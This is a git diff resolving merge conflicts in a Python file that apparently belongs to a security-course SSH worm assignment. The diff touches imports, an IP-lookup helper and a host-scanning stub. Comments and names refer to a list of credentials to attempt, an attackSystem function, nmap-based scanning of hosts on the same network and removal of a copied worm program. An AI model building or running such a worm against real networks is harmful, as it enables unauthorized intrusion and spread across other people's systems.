@@ -4,13 +4,10 @@ import socket
 import nmap
 import netinfo
 import os
-<<<<<<< HEAD
 import socket
 from hostscan import getHostsOnTheSameNetwork
 from getip import getifip
-=======
 import hostscan
->>>>>>> 3b7da10208341c9f09e564928b18033baba804b5
 
 # The list of credentials to attempt
 credList = [
@@ -146,13 +143,8 @@ def attackSystem(host):
 def getMyIP(interface):
     # TODO: Change this to retrieve and
     # return the IP of the current system.
-<<<<<<< HEAD
     ip_addr = getifip()
     return ip_addr
-=======
-    return None
-
->>>>>>> 3b7da10208341c9f09e564928b18033baba804b5
 
 #######################################################
 # Returns the list of systems on the same network
@@ -177,16 +169,10 @@ def getHostsOnTheSameNetwork():
             liveHosts.append(host)
     return liveHosts
 
-<<<<<<< HEAD
     # TODO: Add code for scanning
     # for hosts on the same network
     # and return the list of discovered
     # IP addresses.
-    sameNetworks = getHostsOnTheSameNetwork
-=======
->>>>>>> 3b7da10208341c9f09e564928b18033baba804b5
-
-    return sameNetworks
 #######################################################
 # Clean by removing the marker and copied worm program
 # @param sshClient - the instance of the SSH client
